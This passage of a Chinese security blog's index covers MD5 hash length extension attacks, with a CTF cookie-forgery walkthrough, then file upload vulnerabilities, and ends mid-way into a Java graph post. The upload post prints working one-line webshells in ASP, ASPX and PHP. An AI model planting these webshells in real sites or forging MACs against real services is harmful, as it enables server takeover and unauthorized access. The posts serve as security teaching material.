src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.59.48.png" alt="单轮循环中的单次迭代逻辑" style="zoom:50%;"><p>每轮循环迭代运算的逻辑：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>对A迭代：a <span class="token operator">&lt;</span>—— <span class="token number">6</span>+<span class="token punctuation">((</span>a+g<span class="token punctuation">(</span>b,c,d<span class="token punctuation">)</span>+X<span class="token punctuation">[</span>k<span class="token punctuation">]</span>+T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;&lt;</span>s<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>缓冲区（A,B,C,D<span class="token punctuation">)</span>作循环轮换：<span class="token punctuation">(</span>B,C,D,A<span class="token punctuation">)</span> <span class="token operator">&lt;</span>——<span class="token punctuation">(</span>A,B,C,D<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>a，b，c，d是缓冲区的当前值</li><li>g是4个轮函数之一，输入输出都是<code>32bit</code>，进行不同的逻辑运算</li><li><code>&lt;&lt;&lt;s</code>（CLS（s））是指把<code>bit32</code>循环左移<code>s</code>位，<code>s</code>可查表得到</li><li><code>X[k]</code>是当前处理消息分组的第<code>k</code>个<code>32bit</code>（一共512/32=16个字），在每一轮循环中都由不同的公式计算出来</li><li><code>T[i]</code>通过查表得到，32bit字</li><li>所有的加法都是模$2^32$加法</li></ul><p>4个轮函数逻辑如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2011.05.00.png" alt="4个轮函数" style="zoom:50%;"><p>每轮循环中<code>X[k]</code>所取的<code>k</code>的计算方法为：</p><p>取<code>j</code>为当前迭代轮次</p><ol><li>第一轮循环：<code>k = j</code></li><li>第二轮循环：<code>k = (1 + 5 * j) % 16</code></li><li>第三轮循环：<code>k = (5 + 3 * j) % 16</code></li><li>第四轮循环：<code>k = (7 * j) % 16</code></li></ol><h3 id="1-2-5-更新寄存器"><a href="#1-2-5-更新寄存器" class="headerlink" title="1.2.5 更新寄存器"></a>1.2.5 更新寄存器</h3><p>根据每轮的计算结果更新寄存器A、B、C、D的值。</p><h3 id="1-3-6-生成哈希值"><a href="#1-3-6-生成哈希值" class="headerlink" title="1.3.6 生成哈希值"></a>1.3.6 生成哈希值</h3><p>最后一轮得到的结果经过高低位互换后就是最终的结果。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">6f8db599de986fab7a21625b7916589c<span class="token assign-left variable">A</span><span class="token operator">=</span>0x99b58d6f<span class="token assign-left variable">B</span><span class="token operator">=</span>0xab6f98de<span class="token assign-left variable">C</span><span class="token operator">=</span>0x5b62217a<span class="token assign-left variable">D</span><span class="token operator">=</span>0x9c581679<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>A B C D 分别按字节反转后拼接构成最后的哈希值。</p><h1 id="二、哈希长度扩展攻击原理"><a href="#二、哈希长度扩展攻击原理" class="headerlink" title="二、哈希长度扩展攻击原理"></a>二、哈希长度扩展攻击原理</h1><h2 id="2-1-攻击场景"><a href="#2-1-攻击场景" class="headerlink" title="2.1 攻击场景"></a>2.1 攻击场景</h2><h3 id="2-1-1-攻击场景1-文件下载权限验证"><a href="#2-1-1-攻击场景1-文件下载权限验证" class="headerlink" title="2.1.1 攻击场景1-文件下载权限验证"></a>2.1.1 攻击场景1-文件下载权限验证</h3><p>Message Authentication Codes (MACs)是用于验证信息真实性的算法。最简单的MAC算法是这样的：服务器把key和message连接到一起，然后用摘要算法如<code>MD5</code>或<code>SHA1</code>取出摘要。</p><p>例如有一个网站，在用户下载文件之前需验证下载权限。</p><p>这个网站会用如下的算法产生一个关于文件名的MAC：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">def Create_MAC<span class="token punctuation">(</span>key, filename<span class="token punctuation">)</span>   <span class="token builtin class-name">return</span> Digest::MD5.hexdigest<span class="token punctuation">(</span>key + filename<span class="token punctuation">)</span>end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>key对于攻击者来说是未知的。</p><p>用户请求下载test.pdf文件时提交如下请求：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/download?file<span class="token operator">=</span>test.pdf<span class="token operator">&amp;</span><span class="token assign-left variable">mac</span><span class="token operator">=</span>ca21cf672b66a5ee6fa7fc7c1c314ff3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当用户发起请求要下载一个文件时，会执行下面这个函数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">def verify_mac<span class="token punctuation">(</span>key, filename, userMAC<span class="token punctuation">)</span>    validMAC <span class="token operator">=</span> create_MAC<span class="token punctuation">(</span>key, filename<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>validMAC <span class="token operator">==</span> userMAC<span class="token punctuation">)</span> <span class="token keyword">do</span>        initiateDownload<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span>        displayError<span class="token punctuation">(</span><span class="token punctuation">)</span>    endend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端根据key和用户提交的文件名生成一个哈希值，跟用户提交的哈希值做比对，比对成功才会允许下载文件，这种情况下要求文件名和用户提供的mac值都是合法的。</p><p>本意是通过key的保密性来验证身份，因为正常情况下只有服务端和合法客户端才掌握key。</p><p>这样，只有当用户没有擅自更改文件名时服务器才会执行<code>initiateDownload()</code>开始下载。</p><p>但是这种生成MAC的方式，会给攻击者在文件名后添加自定义的字符串留下隐患。 </p><p>这种方法就是哈希长度拓展攻击。</p><p>攻击结果：不知道key、不知道合法文件名，但是能通过验证。</p><h3 id="2-1-2-攻击场景2"><a href="#2-1-2-攻击场景2" class="headerlink" title="2.1.2 攻击场景2"></a>2.1.2 攻击场景2</h3><p>在一道web题目中遇到了以下判断: <code>if ($COOKIE["md5hash"] === md5($secret . $input))</code></p><p>在该题目中我们可以掌握的参数有<code>md5hash</code>、<code>input</code>的值，<code>secret</code>的md5值和长度，我们需要想办法让这个判断通过。</p><p>难点在于：不知道$secret的情况下，传递一个哈希值和input，使得哈希值===md5($secret.$input)。</p><h2 id="2-2-哈希长度扩展攻击简介"><a href="#2-2-哈希长度扩展攻击简介" class="headerlink" title="2.2 哈希长度扩展攻击简介"></a>2.2 哈希长度扩展攻击简介</h2><p>哈希长度扩展攻击（Hash Length Extension Attacks）是一种针对某些加密散列函数的攻击手段，特别适用于那些基于Merkle–Damgård结构的算法，如MD5和SHA-1。这类攻击的核心在于，如果你知道一个消息（message）和密钥（key）的组合的哈希值，即使不知道密钥的具体值，只要知道密钥的长度，你就能在这个消息后面添加额外的信息，并计算出新的哈希值。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5<span class="token punctuation">(</span>xxxxx+<span class="token string">"plainText"</span><span class="token punctuation">)</span><span class="token operator">=</span>cdf1ea<span class="token punctuation">..</span>md5<span class="token punctuation">(</span>xxxxx+<span class="token string">"plainText"</span>+<span class="token string">"abcdfafa"</span><span class="token punctuation">)</span><span class="token operator">=</span>ade24242<span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>攻击条件：</p><ol><li>﻿﻿消息可控已知</li><li>﻿﻿密钥长度已知</li><li>﻿﻿﻿使用MD5加密且结果可知</li></ol><h2 id="2-3-攻击步骤"><a href="#2-3-攻击步骤" class="headerlink" title="2.3 攻击步骤"></a>2.3 攻击步骤</h2><h3 id="2-3-1-以某CTF赛题为例子"><a href="#2-3-1-以某CTF赛题为例子" class="headerlink" title="2.3.1 以某CTF赛题为例子"></a>2.3.1 以某CTF赛题为例子</h3><ul><li>代码如下：</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2014.21.21.png" alt="CTF赛题实例" style="zoom:50%;"><h3 id="2-3-2-条件分析"><a href="#2-3-2-条件分析" class="headerlink" title="2.3.2 条件分析"></a>2.3.2 条件分析</h3><p>从代码中已知<code>$this-&gt;sess=md5($this-&gt;token.$this-&gt;username)</code>，在不传递任何参数的情况下，<code>$sess</code>为token（20个未知字符）与”admin”组成的字符串的md5值，并且会在cookie中返回。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sess</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>从上面的代码可知，$sess和$username的值是用户提交的。</p><p>获取flag的条件是：提交一个伪造的非”admin”的username，并且提交该username与token拼接之后的md5值（也就是$sess），但是由于toekn不为我们所知晓，我们也无从计算出正确的md5值。</p><p>我们目前掌握的信息：</p><p>1）????????????????????admin 的哈希值 （?表示的内容为未知token），记为H1。</p><p>2）未知token的长度为20。</p><p>3）username和sess的值是可控的。</p><h3 id="2-3-3-核心要点"><a href="#2-3-3-核心要点" class="headerlink" title="2.3.3 核心要点"></a>2.3.3 核心要点</h3><p>巧妙利用md5哈希算法的分组运算机制。</p><p>将H1当作某个明文（这个明文我们需要伪造）中的第一个数据块（512bit）的散列值。根据md5算法以每512bit为数据块计算散列值的原理，当计算第二个数据块的散列值时，会以H1作为ABCD寄存器的缓存值。</p><p>我们如果能把字符串扩展到512bit以上，并保证第一段的md5运算结果不改变，那么我们在不知道第一段的加密内容的情况下仍然能够求得整体的md5值。此所谓”扩展”的含义。</p><h3 id="2-3-4-攻击实施"><a href="#2-3-4-攻击实施" class="headerlink" title="2.3.4 攻击实施"></a>2.3.4 攻击实施</h3><h4 id="1）模仿md5算法的填充"><a href="#1）模仿md5算法的填充" class="headerlink" title="1）模仿md5算法的填充"></a>1）模仿md5算法的填充</h4><p>所以我们首先要做的就是”模仿”md5算法的补位方式来进行补位。</p><p>????????????????????admin的长度=20+5=25个byte25*8=200bit</p><p>表示成16进制即为：0xC8=12*16+8=200</p><p>所以填充的结果如下（称为M1）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">【????????????????????admin】【8000000<span class="token punctuation">..</span><span class="token punctuation">..</span>000000】【c800000000000000】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>【（????????????????????admin）】为消息内容。</p><p>【8000000….000000】为填充值。</p><p>【c800000000000000】为长度填充。</p><p>如此一来，M1经过md5算法计算的结果，跟md5（????????????????????admin）计算的结果是一致的。我们知识作了md5算法本身就该做的事情。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5<span class="token punctuation">(</span>M1<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>md5<span class="token punctuation">(</span>????????????????????admin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如前文所述，实际上在本实例中上述值我们是知道的，eg:ae8b63d93b14eadd1adb347c9e26595a（H1）</p><h4 id="2）将已知的H1值作为作为ABCD寄存器的缓存值"><a href="#2）将已知的H1值作为作为ABCD寄存器的缓存值" class="headerlink" title="2）将已知的H1值作为作为ABCD寄存器的缓存值"></a>2）将已知的H1值作为作为ABCD寄存器的缓存值</h4><p>将<code>ae8b63d93b14eadd1adb347c9e26595a</code>分成8字节唯一组的四组，ae8b63d9,3b14eadd,1adb347c,9e26595a</p><p>由于md5是小端存储，进行相应的调整：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">A</span><span class="token operator">=</span>0xd9638bae<span class="token assign-left variable">B</span><span class="token operator">=</span>0xddea143b<span class="token assign-left variable">C</span><span class="token operator">=</span>0x7c34db1a<span class="token assign-left variable">D</span><span class="token operator">=</span>0x5a59269e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3）拼接第二段内容"><a href="#3）拼接第二段内容" class="headerlink" title="3）拼接第二段内容"></a>3）拼接第二段内容</h4><p>M1+fakeadmin</p><p>将我们求出来的ABCD序列作为初始序列，利用md5算法对<code>fakeadmin</code>这个字符串进行md5加密。得到md5值：</p><p>比如是：bdbe1c6fb9d921e4ba3d9d4072b702f7（H2）</p><p>这个H2===md5(M1+fakeadmin)</p><h3 id="2-3-5-修改cookie获取flag"><a href="#2-3-5-修改cookie获取flag" class="headerlink" title="2.3.5 修改cookie获取flag"></a>2.3.5 修改cookie获取flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">username</span><span class="token operator">=</span>M1+fakeadmin<span class="token assign-left variable">session</span><span class="token operator">=</span>bdbe1c6fb9d921e4ba3d9d4072b702f7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="三、攻击工具"><a href="#三、攻击工具" class="headerlink" title="三、攻击工具"></a>三、攻击工具</h1><p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a> 【hash_extender】</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-d</span> 被扩展的明文<span class="token parameter variable">-a</span> 附加的到原来hash的padding<span class="token parameter variable">-l</span> 盐的长度<span class="token parameter variable">-f</span> 加密方式<span class="token parameter variable">-s</span> 带盐加密的hash值--out-data-format 输出格式<span class="token parameter variable">--quiet</span> 仅输出必要的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        </p>]]></content>
      
      
      <categories>
          
          <category> 密码学算法安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学算法安全 </tag>
            
            <tag> 哈希长度扩展攻击 </tag>
            
            <tag> md5哈希长度扩展攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞基础</title>
      <link href="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/"/>
      <url>/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>网站提供文件上传功能，但是对用户上传的内容过滤不严格，导致用户上传任意文件甚至恶意文件， 包括恶意脚本文件、exe程序等——&gt;文件上传漏洞。</p><h1 id="二、漏洞成因"><a href="#二、漏洞成因" class="headerlink" title="二、漏洞成因"></a>二、漏洞成因</h1><ul><li>1、服务器配置不当</li><li>2、开放了文件上传功能，但是对上传的内容没有做限制</li><li>3、限制不严格导致被绕过</li></ul><h1 id="三、漏洞危害"><a href="#三、漏洞危害" class="headerlink" title="三、漏洞危害"></a>三、漏洞危害</h1><ul><li><p>任意文件上传：恶意脚本、程序等。</p></li><li><p>上传的可写目录也具有可执行权限，上传webshell导致网站沦陷。</p></li><li><p>通过其他漏洞提权，导致服务器沦陷，波及旁站。</p></li></ul><h1 id="四、webshell"><a href="#四、webshell" class="headerlink" title="四、webshell"></a>四、webshell</h1><h2 id="4-1-概念"><a href="#4-1-概念" class="headerlink" title="4.1 概念"></a>4.1 概念</h2><p>通过上传漏洞获得的网站后门，webshell也是一个命令解释器，继承web用户权限。本质上是一个可以在服务端运行的脚本文件。</p><h2 id="4-2-大马"><a href="#4-2-大马" class="headerlink" title="4.2 大马"></a>4.2 大马</h2><p>代码复杂，功能强大：文件管理、执行系统命令</p><p>⚠️：密码一般写在文件中</p><h2 id="4-3-小马"><a href="#4-3-小马" class="headerlink" title="4.3 小马"></a>4.3 小马</h2><h3 id="4-3-1-一句话木马"><a href="#4-3-1-一句话木马" class="headerlink" title="4.3.1 一句话木马"></a>4.3.1 一句话木马</h3><ul><li>asp</li></ul><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%eval&nbsp;request("x")%&gt;&nbsp;&lt;%execute&nbsp;request("x")%&gt;&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>aspx（ASP.NET）</li></ul><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%@&nbsp;Page&nbsp;Language="Jscript"%&gt;&lt;%eval(Request.Item["x"],"unsafe");%&gt;&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;%@ Page Language="Jscript"%&gt;：这行代码是一个指令，告诉ASP.NET页面，页面中的脚本应该使用JScript（也就是微软的JavaScript实现）来编写。这允许你在ASP.NET页面中使用JavaScript代码。&lt;%eval(Request.Item["x"],"unsafe");%&gt;：&lt;% ... %&gt;：这是ASP.NET中执行服务器端代码的语法。eval：这是一个JavaScript函数，它接受一个字符串参数，并尝试执行这个字符串作为代码。这是一个非常危险的函数，因为它可以执行任何JavaScript代码，包括恶意代码。Request.Item["x"]：这行代码从HTTP请求中获取名为"x"的项的值。这通常是一个查询字符串参数，例如在URL中 ?x=someValue。"unsafe"：这是eval函数的一个参数，指定了代码执行的上下文。在这种情况下，它允许代码在全局上下文中执行，这意味着它可以访问和修改全局变量。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>【asp VS aspx】</p><pre class="line-numbers language-none"><code class="language-none">ASP（Active Server Pages）和ASP.NET（通常以文件扩展名.aspx表示）是微软开发的两种不同的服务器端脚本技术，用于创建动态网页。它们之间存在一些关键的区别：一、技术基础：ASP：基于VBScript或JavaScript，是一种较老的技术，运行在IIS（Internet Information Services）服务器上。ASP.NET：是.NET Framework的一部分，支持多种语言（如C#、VB.NET等），提供了更强大的功能和性能。二、执行模式：ASP：解释执行，每次请求页面时，服务器都会解释执行ASP代码。ASP.NET：编译执行，.aspx页面在第一次请求时被编译成中间语言（IL），然后由.NET运行时环境执行，这提供了更好的性能。三、开发环境：ASP：开发环境相对简单，通常使用文本编辑器和IIS。ASP.NET：提供了集成开发环境（IDE），如Visual Studio，支持代码提示、调试和其他高级功能。四、状态管理：ASP：状态管理较为有限，通常依赖于Cookies或隐藏表单字段。ASP.NET：提供了更丰富的状态管理选项，如ViewState、Session State、Cache等。五、安全性：ASP：安全性较低，容易受到脚本注入等攻击。ASP.NET：提供了更高级的安全特性，如输入验证、成员资格和角色管理。六、跨平台性：ASP：主要运行在Windows服务器上。ASP.NET：虽然主要也是在Windows上运行，但随着.NET Core的发展，ASP.NET Core已经支持跨平台运行。总的来说，ASP.NET是ASP的后继者，提供了更现代、更强大的Web开发功能。随着技术的发展，ASP.NET已经演进到ASP.NET Core，这是一个更轻量级、高性能、跨平台的框架。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token prolog">&lt;?php @eval($_REQUEST['cmd’]);?&gt;</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>jsp</li><li>jspx</li></ul><p>jSP和jspx的一句话木马比较复杂一些。</p><p>【jsp vs jspx】</p><pre class="line-numbers language-none"><code class="language-none">JSP（JavaServer Pages）和 JSPX 是 Java Web 开发中用于创建动态网页的技术。它们允许开发者在 HTML 页面中嵌入 Java 代码。以下是 JSP 和 JSPX 的主要区别：1、文件扩展名：JSP：文件通常以 .jsp 作为扩展名。JSPX：文件以 .jspx 作为扩展名。2、XML基础：JSP：不是基于 XML 的，这意味着在 JSP 文件中，HTML 标签不需要关闭，可以自由地混合 HTML 和 Java 代码。JSPX：基于 XML 的，要求页面必须符合 XML 的格式，所有的 HTML 标签都需要正确关闭，以确保文件在 XML 格式上是有效的。3、脚本元素：JSP：使用 &lt;% %&gt; 来嵌入 Java 代码，使用 &lt;%! %&gt; 来声明类级别的变量和方法，使用 &lt;%= %&gt; 来输出表达式的结果。JSPX：使用 &lt;jsp:scriptlet&gt; 来嵌入 Java 代码，使用 &lt;jsp:declaration&gt; 来声明方法，输出表达式的结果通常使用 JSPX 的标准动作 &lt;jsp:expression&gt;。4、标准动作和标签库：JSP：可以使用 JSP 标准标签库（JSTL）来增加功能，但需要手动添加标签库的指令。JSPX：天然支持 JSP 标准标签库，不需要额外的指令就可以使用 JSTL。5、配置和部署：JSP：在 web.xml 中配置 servlet 映射。JSPX：通常不需要在 web.xml 中进行额外的配置，因为它们是作为 JSP 的扩展。6、开发工具支持：JSP：大多数 Java IDE 和文本编辑器都支持 JSP 开发。JSPX：可能需要更高级的 IDE 支持，因为它是基于 XML 的。7、性能：JSP：在性能上可能略有优势，因为它们不需要遵循 XML 的严格格式。JSPX：由于 XML 的解析可能稍微慢一些，但这种差异通常可以忽略不计。8、可读性和维护性：JSPX：由于其 XML 基础，可以提供更好的可读性和维护性，特别是对于大型项目。在实际开发中，选择 JSP 还是 JSPX 通常取决于项目需求、团队偏好以及开发工具的支持。JSPX 提供了更严格的结构，有助于保持代码的整洁和一致性，而 JSP 则提供了更多的灵活性。随着 JavaServer Faces (JSF) 框架的流行，JSPX 也变得更加流行，因为 JSF 页面默认使用 .jspx 扩展名。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">在Java Web开发中，如果后端文件以JSP或JSPX结尾，这通常意味着该Web系统可能是基于以下框架开发的：1、JavaServer Pages (JSP)：JSP是一种服务器端技术，允许开发者在HTML页面中嵌入Java代码。JSP文件通常用于生成动态Web内容。如果一个Web系统的后端文件以.jsp结尾，这可能表明它是一个传统的JSP应用。2、JavaServer Faces (JSF)：JSF是一个基于组件的Web应用框架，它使用JSPX文件作为其视图技术。JSPX文件是JSP的XML兼容版本，它们提供了更严格的格式，并且与JSF的组件模型紧密集成。如果后端文件以.jspx结尾，这可能意味着该系统使用了JSF框架。3、Spring MVC：虽然Spring MVC通常与Thymeleaf或Freemarker模板引擎一起使用，但它也可以与JSP或JSPX文件一起工作。在Spring MVC应用中，控制器会处理HTTP请求并返回一个视图名称，这个视图名称可以映射到一个JSP或JSPX页面。4、Struts：Struts是一个MVC框架，它也支持使用JSP和JSPX文件作为其视图层。在Struts应用中，JSP和JSPX文件用于展示数据和处理用户输入。5、其他Java EE技术：除了上述框架，还有其他Java EE技术可能使用JSP和JSPX文件，如EJB（Enterprise JavaBeans）。   需要注意的是，JSP和JSPX文件可以与多种Java Web框架一起使用，它们本身并不局限于特定的框架。开发者可以根据自己的需求和偏好选择合适的框架和技术栈。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-3-2-配合菜刀、蚁剑使用"><a href="#4-3-2-配合菜刀、蚁剑使用" class="headerlink" title="4.3.2 配合菜刀、蚁剑使用"></a>4.3.2 配合菜刀、蚁剑使用</h3><p>文件管理<br>        虚拟终端<br>        数据库管理：此时需要知道连接数据库的账密</p><h2 id="4-4-getshell"><a href="#4-4-getshell" class="headerlink" title="4.4 getshell"></a>4.4 getshell</h2><p>获取webshell的的过程和结果</p><p>主要方式：借助文件上传漏洞。</p><h1 id="五、文件上传漏洞的基础利用和防御绕过"><a href="#五、文件上传漏洞的基础利用和防御绕过" class="headerlink" title="五、文件上传漏洞的基础利用和防御绕过"></a>五、文件上传漏洞的基础利用和防御绕过</h1><h2 id="5-1-利用条件"><a href="#5-1-利用条件" class="headerlink" title="5.1 利用条件"></a>5.1 利用条件</h2><ul><li>有可访问的文件上传功能</li></ul><p>任意文件上传漏洞，首先要有能上传文件的的地方，即——要有文件上传点。有一些网站虽然貌似没有上传点，但是其实存在上传代码的。虽然没有明确使用上传功能 ，但使用了上传有关的函数，这种情况需要通过代码审计去看。</p><p>最常见的就是上传头像。</p><ul><li><p>写权限+执行权限</p></li><li><p>Web容器可以解析webshell</p></li><li><p>能访问得到上传的文件：如果访问不到，则无法对文件进行控制，也就没有漏洞的说法</p></li><li><p>无视以上条件配置不当：有PUT方法（只要有PUT方法必有文件上传漏洞）</p></li></ul><h2 id="5-2-利用-HTTP-PUT方法上传文件"><a href="#5-2-利用-HTTP-PUT方法上传文件" class="headerlink" title="5.2 利用 HTTP PUT方法上传文件"></a>5.2 利用 HTTP PUT方法上传文件</h2><h3 id="5-2-1-Apache-如何开启-PUT方法"><a href="#5-2-1-Apache-如何开启-PUT方法" class="headerlink" title="5.2.1 Apache 如何开启 PUT方法"></a>5.2.1 Apache 如何开启 PUT方法</h3><h3 id="5-2-2-PUT方法的上传漏洞"><a href="#5-2-2-PUT方法的上传漏洞" class="headerlink" title="5.2.2 PUT方法的上传漏洞"></a>5.2.2 PUT方法的上传漏洞</h3><h2 id="5-3-防御绕过和利用"><a href="#5-3-防御绕过和利用" class="headerlink" title="5.3 防御绕过和利用"></a>5.3 防御绕过和利用</h2><h2 id="5-4-00截断"><a href="#5-4-00截断" class="headerlink" title="5.4 00截断"></a>5.4 00截断</h2>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> 基础知识库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图-图的通用结构表达的建立</title>
      <link href="/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/"/>
      <url>/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/</url>
      
        <content type="html"><![CDATA[<h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h1><p>  图的表达方法千千万，平时选一个自己最喜欢的结构，把所有算法都在这个结构上玩通，以后遇到陌生的图结构表达，转化为自己喜欢的那个结构，然后用自己实现的算法即可。重点就是实现一个接口将陌生的图表达数据结构转化为自己熟悉的图结构表达。</p><h1 id="2-Node类"><a href="#2-Node类" class="headerlink" title="2.Node类"></a>2.Node类</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span><span class="token comment">//节点值</span><span class="token keyword">public</span> <span class="token keyword">int</span> in<span class="token punctuation">;</span><span class="token comment">//入度</span><span class="token keyword">public</span> <span class="token keyword">int</span> out<span class="token punctuation">;</span><span class="token comment">//出度</span><span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">&gt;</span></span> nexts<span class="token punctuation">;</span><span class="token comment">//下行的邻居节点</span><span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">&gt;</span></span> edges<span class="token punctuation">;</span><span class="token comment">//下行边</span><span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token operator">=</span>value<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>in<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>out<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>nexts<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>edges<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" 